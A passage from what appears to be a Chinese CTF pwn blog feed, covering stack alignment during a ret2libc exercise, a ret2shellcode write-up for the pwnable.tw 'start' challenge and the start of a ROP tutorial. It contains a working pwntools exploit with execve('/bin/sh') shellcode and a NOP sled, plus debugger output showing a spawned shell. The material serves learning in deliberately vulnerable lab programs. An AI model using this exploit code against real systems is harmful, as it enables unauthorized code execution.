punctuation">[</span>esp+0xc<span class="token punctuation">]</span>,0x0 804862d:    00  804862e:    c7 44 24 08 02 00 00     mov    DWORD PTR <span class="token punctuation">[</span>esp+0x8<span class="token punctuation">]</span>,0x2 8048635:    00  8048636:    c7 44 24 04 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>esp+0x4<span class="token punctuation">]</span>,0x0 804863d:    00  804863e:    89 04 24                 mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,eax 8048641:    e8 5a fe ff ff           call   80484a0 <span class="token operator">&lt;</span>setvbuf@plt<span class="token operator">></span> 8048646:    a1 40 a0 04 08           mov    eax,ds:0x804a040 804864b:    c7 44 24 0c 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>esp+0xc<span class="token punctuation">]</span>,0x0 8048652:    00  8048653:    c7 44 24 08 01 00 00     mov    DWORD PTR <span class="token punctuation">[</span>esp+0x8<span class="token punctuation">]</span>,0x1 804865a:    00  804865b:    c7 44 24 04 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>esp+0x4<span class="token punctuation">]</span>,0x0 8048662:    00  8048663:    89 04 24                 mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,eax 8048666:    e8 35 fe ff ff           call   80484a0 <span class="token operator">&lt;</span>setvbuf@plt<span class="token operator">></span> 804866b:    c7 04 24 40 87 04 08     mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0x8048740 8048672:    e8 e9 fd ff ff           call   8048460 <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span> 8048677:    c7 04 24 6b 87 04 08     mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,0x804876b 804867e:    e8 ad fd ff ff           call   8048430 <span class="token operator">&lt;</span>printf@plt<span class="token operator">></span> 8048683:    8d 44 24 1c              lea    eax,<span class="token punctuation">[</span>esp+0x1c<span class="token punctuation">]</span> 8048687:    89 04 24                 mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,eax 804868a:    e8 b1 fd ff ff           call   8048440 <span class="token operator">&lt;</span>gets@plt<span class="token operator">></span> 804868f:    b8 00 00 00 00           mov    eax,0x0 8048694:    c9                       leave   8048695:    c3                       ret   </code></pre><p>第一第二行是常规操作。</p><h4 id="第四第五行：被称为栈对齐"><a href="#第四第五行：被称为栈对齐" class="headerlink" title="第四第五行：被称为栈对齐"></a>第四第五行：被称为栈对齐</h4><pre class=" language-bash"><code class="language-bash">804861b:    83 e4 f0                 and    esp,0xfffffff0  //esp最后一个字节清零804861e:    83 c4 80                 add    esp,0xffffff80  //esp倒数第二个字节如果大于等于8则变为8，小于则清零，倒数第一个字节也清零</code></pre><h3 id="栈对齐有关资料：64位"><a href="#栈对齐有关资料：64位" class="headerlink" title="栈对齐有关资料：64位"></a>栈对齐有关资料：64位</h3><blockquote><p>许多计算机系统对基本数据类型的合法地址做了一些限制，要求某种类型对象的地址必须是某个值K的倍数，其中K具体如下图。这种对齐限制简化了形成处理器和内存系统之间接口的硬件设计。举个实际的例子：比如我们在内存中读取一个8字节长度的变量，那么这个变量所在的地址必须是8的倍数。如果这个变量所在的地址是8的倍数，那么就可以通过一次内存操作完成该变量的读取。倘若这个变量所在的地址并不是8的倍数，那么可能就需要执行两次内存读取，因为该变量被放在两个8字节的内存块中了。</p></blockquote><blockquote><p>无论数据是否对齐，x86_64硬件都能正常工作，但是却会降低系统的性能，所以我们的编译器在编译时一般会为我们实施数据对齐。</p></blockquote><blockquote><p>栈的字节对齐，实际是指栈顶指针必须须是16字节的整数倍。栈对齐帮助在尽可能少的内存访问周期内读取数据，不对齐堆栈指针可能导致严重的性能下降。<br>上文我们说，即使数据没有对齐，我们的程序也是可以执行的，只是效率有点低而已，但是某些型号的Intel和AMD处理器对于有些实现多媒体操作的SSE指令，如果数据没有对齐的话，就无法正确执行。这些指令对16字节内存进行操作，在SSE单元和内存之间传送数据的指令要求内存地址必须是16的倍数。</p><blockquote><blockquote><p>因此，任何针对x86_64处理器的编译器和运行时系统都必须保证分配用来保存可能会被SSE寄存器读或写的数据结构的内存，都必须是16字节对齐的，这就形成了一种标准：<br>任何内存分配函数（alloca, malloc, calloc或realloc）生成的块起始地址都必须是16的倍数。<br>大多数函数的栈帧的边界都必须是16直接的倍数。<br>在运行时栈中，不仅传递的参数和局部变量要满足字节对齐，我们的栈指针（%rsp）也必须是16的倍数。</p></blockquote></blockquote></blockquote><p>详情见：<a href="https://www.cnblogs.com/tcctw/p/11333743.html" target="_blank" rel="noopener">https://www.cnblogs.com/tcctw/p/11333743.html</a></p><p>总结：为了满足数据对齐和栈字节对齐的要求，或者说规范，编译器不惜牺牲了部分内存，这使得程序提高了兼容性，也提高了程序的性能</p><p><strong>在常规操作push  ebp 和mov  ebp，esp后面免不了这种调整栈空间的指令 这样的指令对第一次求溢出是没有影响的，因为只要看最后的ret部分。但是如果进行第二次攻击再次从main函数进入将再次执行这样的影响 esp的指令 我们再次使用之前的溢出点就可能会出错。就像这里的栈对齐操作，显然这个操作与esp本身的大小有关。在程序最后直接ret到main函数会导致esp加4从而下次的栈对齐操作因为esp变化了所以栈空间也会发生变化。导致变化完了后esp到ebp的距离不再是114. 解决方法就是在脚本中用gdb.attach()进入调试在即将进行第二次之前在main函数下断点，从而观察，调整溢出点。</strong></p><h3 id="下面我直接跳到ret处了，从这里的esp也很容易看出前面8个A是多余的所以得出第二次溢出点位104"><a href="#下面我直接跳到ret处了，从这里的esp也很容易看出前面8个A是多余的所以得出第二次溢出点位104" class="headerlink" title="下面我直接跳到ret处了，从这里的esp也很容易看出前面8个A是多余的所以得出第二次溢出点位104"></a>下面我直接跳到ret处了，从这里的esp也很容易看出前面8个A是多余的所以得出第二次溢出点位104</h3><pre class=" language-bash"><code class="language-bash">EBX: 0x0 ECX: 0xf7f9b5c0 --<span class="token operator">></span> 0xfbad2288 EDX: 0xf7f9c89c --<span class="token operator">></span> 0x0 ESI: 0xf7f9b000 --<span class="token operator">></span> 0x1d4d6c EDI: 0x0 EBP: 0x41414141 <span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>ESP: 0xffbedef4 <span class="token punctuation">(</span><span class="token string">"AAAAAAAA\020-\340"</span>, <span class="token operator">&lt;</span>incomplete sequence \367<span class="token operator">></span><span class="token punctuation">)</span>EIP: 0x8048695 <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+125<span class="token operator">></span>:    ret<span class="token punctuation">)</span>EFLAGS: 0x246 <span class="token punctuation">(</span>carry PARITY adjust ZERO sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x804868a <span class="token operator">&lt;</span>main+114<span class="token operator">></span>:    call   0x8048440 <span class="token operator">&lt;</span>gets@plt<span class="token operator">></span>   0x804868f <span class="token operator">&lt;</span>main+119<span class="token operator">></span>:    mov    eax,0x0   0x8048694 <span class="token operator">&lt;</span>main+124<span class="token operator">></span>:    leave  <span class="token operator">=</span><span class="token operator">></span> 0x8048695 <span class="token operator">&lt;</span>main+125<span class="token operator">></span>:    ret       0x8048696:    xchg   ax,ax   0x8048698:    xchg   ax,ax   0x804869a:    xchg   ax,ax   0x804869c:    xchg   ax,ax<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffbedef4 <span class="token punctuation">(</span><span class="token string">"AAAAAAAA\020-\340"</span>, <span class="token operator">&lt;</span>incomplete sequence \367<span class="token operator">></span><span class="token punctuation">)</span>0004<span class="token operator">|</span> 0xffbedef8 <span class="token punctuation">(</span><span class="token string">"AAAA\020-\340"</span>, <span class="token operator">&lt;</span>incomplete sequence \367<span class="token operator">></span><span class="token punctuation">)</span>0008<span class="token operator">|</span> 0xffbedefc --<span class="token operator">></span> 0xf7e02d10 <span class="token punctuation">(</span><span class="token operator">&lt;</span>system<span class="token operator">></span>:    sub    esp,0xc<span class="token punctuation">)</span>0012<span class="token operator">|</span> 0xffbedf00 --<span class="token operator">></span> 0x0 0016<span class="token operator">|</span> 0xffbedf04 --<span class="token operator">></span> 0xf7f418cf <span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>0020<span class="token operator">|</span> 0xffbedf08 --<span class="token operator">></span> 0xf7f9b000 --<span class="token operator">></span> 0x1d4d6c 0024<span class="token operator">|</span> 0xffbedf0c --<span class="token operator">></span> 0xf7fce75a <span class="token punctuation">(</span>add    edi,0x178a6<span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffbedf10 --<span class="token operator">></span> 0xf7fe6000 --<span class="token operator">></span> 0x26f34 <span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, value</code></pre><p>最终结果：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive modev\x84\x04\x86\x84\x04\x90m���Z��\xb6\x84\x04Ƅ\x04No surprise anymore, system disappeard QQ.Can you <span class="token function">find</span> it <span class="token operator">!</span>?$ <span class="token function">ls</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wiki--pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>StackOverFlow之Ret2ShellCode详解</title>
      <link href="/2020/07/02/stackoverflow-zhi-ret2shellcode-xiang-jie/"/>
      <url>/2020/07/02/stackoverflow-zhi-ret2shellcode-xiang-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="函数调用时栈中的变化-test"><a href="#函数调用时栈中的变化-test" class="headerlink" title="函数调用时栈中的变化 test"></a>函数调用时栈中的变化 test</h1><p>示例代码:test.c</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">fun</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>编译程序： gcc test.c -m32 -fno-stack-protector -z execstack -no-pie -o test</strong><br><strong>-fno-stack-protector   ————关闭栈保护 stack</strong><br><strong>-z execstack   ————关闭NX堆栈不可执行</strong><br><strong>-no-pie   ————关闭PIE地址随机化</strong></p><p><strong>然后对test用linux自带的反汇编指令：objdump进行反汇编  objdump -d  :反汇编特定指令机器码的section  -Mintle ：表示用intel语法</strong></p><pre class=" language-bash"><code class="language-bash">objdump test1 -d -Mintel主要函数结果如下080483f6 <span class="token operator">&lt;</span>fun<span class="token operator">></span>: 80483f6:    55                       push   ebp 80483f7:    89 e5                    mov    ebp,esp 80483f9:    e8 42 00 00 00           call   8048440 <span class="token operator">&lt;</span>__x86.get_pc_thunk.ax<span class="token operator">></span> 80483fe:    05 02 1c 00 00           add    eax,0x1c02 8048403:    8b 55 08                 mov    edx,DWORD PTR <span class="token punctuation">[</span>ebp+0x8<span class="token punctuation">]</span> 8048406:    8b 45 0c                 mov    eax,DWORD PTR <span class="token punctuation">[</span>ebp+0xc<span class="token punctuation">]</span> 8048409:    01 d0                    add    eax,edx 804840b:    5d                       pop    ebp 804840c:    c3                       ret    0804840d <span class="token operator">&lt;</span>main<span class="token operator">></span>: 804840d:    55                       push   ebp 804840e:    89 e5                    mov    ebp,esp 8048410:    83 ec 10                 sub    esp,0x10 8048413:    e8 28 00 00 00           call   8048440 <span class="token operator">&lt;</span>__x86.get_pc_thunk.ax<span class="token operator">></span> 8048418:    05 e8 1b 00 00           add    eax,0x1be8 804841d:    c7 45 fc 01 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>,0x1 8048424:    c7 45 f8 02 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span>,0x2 804842b:    ff 75 f8                 push   DWORD PTR <span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span> 804842e:    ff 75 fc                 push   DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span> 8048431:    e8 c0 ff ff ff           call   80483f6 <span class="token operator">&lt;</span>fun<span class="token operator">></span> 8048436:    83 c4 08                 add    esp,0x8 8048439:    b8 00 00 00 00           mov    eax,0x0 804843e:    c9                       leave   804843f:    c3                       ret    </code></pre><p> 观察fun函数可以发现：</p><pre class=" language-bash"><code class="language-bash">push   ebpmov   ebp,esp<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token punctuation">..</span><span class="token punctuation">..</span>.pop ebpret</code></pre><p><em>这段指令标志这一个函数的开始与结束。这四句指令就是函数开辟，栈帧就是一块被ebp和esp夹住的区域的开始与结尾的标志性语句</em></p><p>现在调试看看main函数对fun函数的调用和传值在汇编中是怎样的<br>相关指令：</p><pre class=" language-bash"><code class="language-bash"> 804841d:    c7 45 fc 01 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>,0x1   //将1传给 以<span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>代表的地址处 并以32位即4字节形式传递（DWORD PTR <span class="token punctuation">[</span><span class="token punctuation">]</span>） a <span class="token operator">=</span> 1 8048424:    c7 45 f8 02 00 00 00     mov    DWORD PTR <span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span>,0x2   //将2传给 以<span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span>代表的地址处 并以32位即4字节形式传递（DWORD PTR <span class="token punctuation">[</span><span class="token punctuation">]</span>） b <span class="token operator">=</span> 2 804842b:    ff 75 f8                 push   DWORD PTR <span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span>   //将<span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span>区域的值以32位入栈  即  b <span class="token operator">=</span> 2 入栈 804842e:    ff 75 fc                 push   DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>   //将<span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span>区域的值以32位入栈  即  a <span class="token operator">=</span> 1 入栈 8048431:    e8 c0 ff ff ff           call   80483f6 <span class="token operator">&lt;</span>fun<span class="token operator">></span>  //调用fun函数</code></pre><p><strong>可以发现参数入栈的顺序 与我们c语言正常的调用顺序是相反的：参数逆序入栈。</strong><br><strong><em>调用一个函数前都是先压入参数(没有参数就不用)然后再调用函数汇编表现为 push xxx ; push xxx; push xxx; call xxx的形式</em></strong></p><p>继续看fun函数中对参数的调用（忽略前面两条指令）</p><pre class=" language-bash"><code class="language-bash">8048403:    8b 55 08                 mov    edx,DWORD PTR <span class="token punctuation">[</span>ebp+0x8<span class="token punctuation">]</span>  //将<span class="token punctuation">[</span>ebp+0x8<span class="token punctuation">]</span>区域的值传给edx 即 edx <span class="token operator">=</span> 1 8048406:    8b 45 0c                 mov    eax,DWORD PTR <span class="token punctuation">[</span>ebp+0xc<span class="token punctuation">]</span>  //将<span class="token punctuation">[</span>ebp+0xc<span class="token punctuation">]</span>区域的值传给eax 即 eax <span class="token operator">=</span> 2 8048409:    01 d0                    add    eax,edx  //eax <span class="token operator">=</span> eax + edx</code></pre><p><em>为啥[ebp-0x4]  [ebp-0x8]  对应了fun函数中的 [ebp+0xc] [ebp+0x8]：</em></p><pre class=" language-bash"><code class="language-bash">主要影响指令main:804842b:    ff 75 f8                 push   DWORD PTR <span class="token punctuation">[</span>ebp-0x8<span class="token punctuation">]</span>804842e:    ff 75 fc                 push   DWORD PTR <span class="token punctuation">[</span>ebp-0x4<span class="token punctuation">]</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.<span class="token punctuation">..</span>.<span class="token punctuation">..</span>fun:80483f6:    55                       push   ebp804840e:    89 e5                    mov    ebp,esp  //esp 与 ebp指向同一位置</code></pre><p>示意图<br><img src="https://s1.ax1x.com/2020/07/02/NbwCIH.png" alt=""><br>再试着去理解[ebp-0x4]  [ebp-0x8]  对应了fun函数中的 [ebp+0xc] [ebp+0x8]的原因就很明了了</p><h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><p>此题源程序可以从 pwnable.tw 中获取<br>用checksec 发现保护全关</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/wiki/overflow/Ret2ShellCode/start'</span>    Arch:     i386-32-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span></code></pre><p>因为次elf文件过于简单就没使用IDA了直接linux反汇编</p><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/wiki/overflow/Ret2ShellCode$ objdump start -d -Mintelstart：     文件格式 elf32-i386Disassembly of section .text:08048060 <span class="token operator">&lt;</span>_start<span class="token operator">></span>: 8048060:    54                       push   esp 8048061:    68 9d 80 04 08           push   0x804809d  //压入exit函数地址 8048066:    31 c0                    xor    eax,eax 8048068:    31 db                    xor    ebx,ebx 804806a:    31 c9                    xor    ecx,ecx 804806c:    31 d2                    xor    edx,edx 804806e:    68 43 54 46 3a           push   0x3a465443   //压入字符串 8048073:    68 74 68 65 20           push   0x20656874 8048078:    68 61 72 74 20           push   0x20747261 804807d:    68 73 20 73 74           push   0x74732073 8048082:    68 4c 65 74 27           push   0x2774654c 8048087:    89 e1                    mov    ecx,esp 8048089:    b2 14                    mov    dl,0x14  //0x14 <span class="token operator">=</span> 20 804808b:    b3 01                    mov    bl,0x1 804808d:    b0 04                    mov    al,0x4 804808f:    <span class="token function">cd</span> 80                    int    0x80   //调用write 8048091:    31 db                    xor    ebx,ebx 8048093:    b2 3c                    mov    dl,0x3c  //0x3c <span class="token operator">=</span> 60 8048095:    b0 03                    mov    al,0x3 8048097:    <span class="token function">cd</span> 80                    int    0x80   //调用read 8048099:    83 c4 14                 add    esp,0x14 804809c:    c3                       ret    0804809d <span class="token operator">&lt;</span>_exit<span class="token operator">></span>: 804809d:    5c                       pop    esp 804809e:    31 c0                    xor    eax,eax 80480a0:    40                       inc    eax 80480a1:    <span class="token function">cd</span> 80                    int    0x80</code></pre><p>可以看出这整个程序就_start和_exit两个函数。看代码应该是出题者可以构造的因为按照正常的栈首先因该是 push  ebp而不是esp<br><strong>int 0x80 ; 这代表着系统中断也就是调用系统函数类似于之前所说的call xxxx; 结构不同的是这里面的参数都是寄存器传参</strong>sys_write(fd,&amp;buf,len)ebx 存放的是 fd(文件描述符有0、1、2三个值0代表标准输入1代表标准输出2代表标准错误输出)ecx 中存放的是 buf 的地址也就是将要输出的字符串的首地址edx 存放的是输出字符串的长度<br>mov  ecx,esp因为 esp 指向栈顶且根据实际程序输出ecx 就是存放着 Let’s start the CTF:</p><p>分析两次int 0x80的寄存器参数可知 ：第一次write函数将Let’s start the CTF:恰好20个字符输出。<strong>第二次read函数将读取60个字符，栈溢出。一定注意不论是调用write函数还是read函数在输出和输入字符串时esp并没有立刻改变而是等到特定的指令。</strong></p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>在调用 sys_write() 之前栈帧情况<br><img src="https://s1.ax1x.com/2020/07/02/NbwFJA.png" alt=""><br>蓝色就是buf部分执行sys_read函数时esp 还是指向此地 输入的内容重新覆盖这块缓冲区超出的部分继续向下覆盖。<br>因为ret_addr保存的是exit函数的地址正常返回的话是直接退出程序现在需要控制这个地址使其返回到我们想要去的地方。<br>在write（）后面add    esp,0x14指令将esp指向ret_addr 完成ret指令后 esp指向 原esp地址即指向的数据与地址重合。<br>那么如果我们控制ret再次跳到write函数那么esp地址会被泄露，继续下面的read函数，在read函数中我们就可以写入shellcode，控制其位置然后执行。<br><img src="https://s1.ax1x.com/2020/07/02/NbwkRI.png" alt=""></p><p>执行完sys_read()函数之后还需执行 add esp,0x14 所以 shellcode 能放的地方也只有剩下的40字节但也足够了。</p><p><img src="https://s1.ax1x.com/2020/07/02/Nbwiid.png" alt=""><br>所以 shellcode 的起始地址为 esp+20,之前的部分可任意填充除 ’\x00‘ (会造成截断)之外的内容。<br>exp：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#context.log_level = 'debug'</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./start'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#有时'./start'还是"start"或是"./start"也会引发玄学问题，多注意</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">20</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x08048087</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#此处如果换成sendline会出错，原因目前未知，感觉很玄学</span>stack_addr <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>addr <span class="token operator">=</span>  u32<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span>nopsled <span class="token operator">=</span> <span class="token string">'\x90'</span> <span class="token operator">*</span> <span class="token number">10</span>shellcode <span class="token operator">=</span><span class="token string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'</span>payload2 <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">20</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>addr <span class="token operator">+</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">+</span> nopsled <span class="token operator">+</span> shellcodesh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> </code></pre><p>注意：nopsled = ‘\x90’就是NULL的意思什么都不做，像滑雪橇一样一直划到 shellcode中 可以增强exp的移植性</p><p>因为NX关闭 ，这个题也可以用直接想buf中写入shellcode在用coredump寻找buf地址，转跳该地址来解决</p><p>shellcode集：<a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP链的简单构造</title>
      <link href="/2020/06/01/rop-lian-de-jian-dan-gou-zao/"/>
      <url>/2020/06/01/rop-lian-de-jian-dan-gou-zao/</url>
      
        <content type="html"><![CDATA[<p><strong><em>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</em></strong></p><pre><code>程序存在溢出，并且可以控制返回地址。可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</code></pre><p>首先我们想想如果nx是关闭的我们可以通过构造shellcode放入栈中，再转跳的buf上即可执行我们的shellcode。而打开shell的函数是system（“/bin/sh”）或execve（“/bin/sh”）等。那么问题来了，我们这段ShellCode里面并没有system这个函数，是谁实现了“system(“/bin/sh”)”的效果呢。在网上查了一些资料大致就是：<br>EAX, EBX, ECX, EDX四个寄存器被先后清零，EAX被赋值为0Xb，ECX入栈，“/bin//sh”字符串入栈，并将其首地址赋给了EBX，最后执行完int 80h</p><p>int指令的功能是调用系统中断，所以int 80h就是调用128号中断，在32位的linux系统中，该中断被用于呼叫系统调用程序system_call( )。我们知道出于对硬件和操作系统内核的保护，应用程序的代码一般在保护模式下运行。<br>在这个模式下我们使用的程序和写的代码是没办法访问内核空间的。但是我们显然可以通过调用read( ), write( )之类的函数从键盘读取输入，把其保存在硬盘里的文件中。那么read( ), write( )之类的函数是怎么突破保护模式的管制，成功访问到本该由内核管理的这些硬件呢？<br>答案就在于int 80h这个中断调用。不同的内核态操作通过给寄存器设置不同的值，再调用同样的指令int 80h，就可以通知内核完成不同的功能。而read( ), write( ), system( )之类的需要内核“帮忙”的函数，就是围绕这条指令加上一些额外参数处理，异常处理等代码封装而成的。32位linux系统的内核一共提供了0~337号共计338种系统调用用以实现不同的功能。<br>Linux 32位的系统调用时通过int 80h来实现的，eax寄存器中为调用的功能号，ebx、ecx、edx、esi等等寄存器则依次为参数。<br>以下是一个简单的hello world程序</p><pre class=" language-bash"><code class="language-bash">.section .datamsg:        .ascii <span class="token string">"Hello world!\n"</span>.section .text.globl _start_start:        movl <span class="token variable">$4</span>, %eax        movl <span class="token variable">$1</span>, %ebx        movl <span class="token variable">$msg</span>, %ecx        movl <span class="token variable">$13</span>, %edx        int <span class="token variable">$0x80</span>        movl <span class="token variable">$1</span>, %eax        movl <span class="token variable">$0</span>, %ebx        int <span class="token variable">$0x80</span></code></pre><p>从 /usr/include/asm/unistd.h中可以看到exit的功能号_NR_exit为1，write(_NR_write)功能号为4，因此第一个int 0x80调用之前eax寄存器值为4，ebx为文件描述符，stdout的文件描述符为1，ecx则为buffer的内存地址，edx为buffer长度。第二个int 0x80之前eax为1表示调用exit，ebx为0表示返回0。</p><p>我们常用的：</p><pre class=" language-c"><code class="language-c"><span class="token number">1</span><span class="token punctuation">.</span> sys_exitSyntax<span class="token punctuation">:</span> <span class="token keyword">int</span> <span class="token function">sys_exit</span><span class="token punctuation">(</span><span class="token keyword">int</span> status<span class="token punctuation">)</span>Source<span class="token punctuation">:</span> kernel<span class="token operator">/</span>exit<span class="token punctuation">.</span>cAction<span class="token punctuation">:</span> terminate the current processDetails<span class="token punctuation">:</span> status is <span class="token keyword">return</span> code<span class="token number">3</span><span class="token punctuation">.</span> sys_readSyntax<span class="token punctuation">:</span> ssize_t <span class="token function">sys_read</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> buf<span class="token punctuation">,</span> size_t count<span class="token punctuation">)</span>Source<span class="token punctuation">:</span> fs<span class="token operator">/</span>read_write<span class="token punctuation">.</span>cAction<span class="token punctuation">:</span> read from a file descriptorDetails<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">.</span> sys_writeSyntax<span class="token punctuation">:</span> ssize_t <span class="token function">sys_write</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span> buf<span class="token punctuation">,</span> size_t count<span class="token punctuation">)</span>Source<span class="token punctuation">:</span> fs<span class="token operator">/</span>read_write<span class="token punctuation">.</span>cAction<span class="token punctuation">:</span> write to a file descriptorDetails<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">.</span> sys_execveSyntax<span class="token punctuation">:</span> <span class="token keyword">int</span> <span class="token function">sys_execve</span><span class="token punctuation">(</span><span class="token keyword">struct</span> pt_regs regs<span class="token punctuation">)</span>Source<span class="token punctuation">:</span> arch<span class="token operator">/</span>i386<span class="token operator">/</span>kernel<span class="token operator">/</span>process<span class="token punctuation">.</span>cAction<span class="token punctuation">:</span> execute programDetails<span class="token punctuation">:</span></code></pre><p><img src="https://s1.ax1x.com/2020/06/01/t3TOts.png" alt=""></p><p>很容易发现ShellCode中的EAX = 0Xb = 11，EBX = &amp;(“/bin//sh”), ECX = EDX = 0，即执行了sys_execve(“/bin//sh”, 0, 0, 0)，通过/bin/sh软链接打开一个shell，所以我们可以在没有system函数的情况下打开shell。<br>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。</p><p>比如我们像得到shell可以执行这个函数：execve(“/bin/sh”,NULL,NULL)<br>那么：其中，该程序是 32 位，所以我们需要使得</p><pre><code>系统调用号，即 eax 应该为 0xb第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。第二个参数，即 ecx 应该为 0第三个参数，即 edx 应该为 0</code></pre><p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 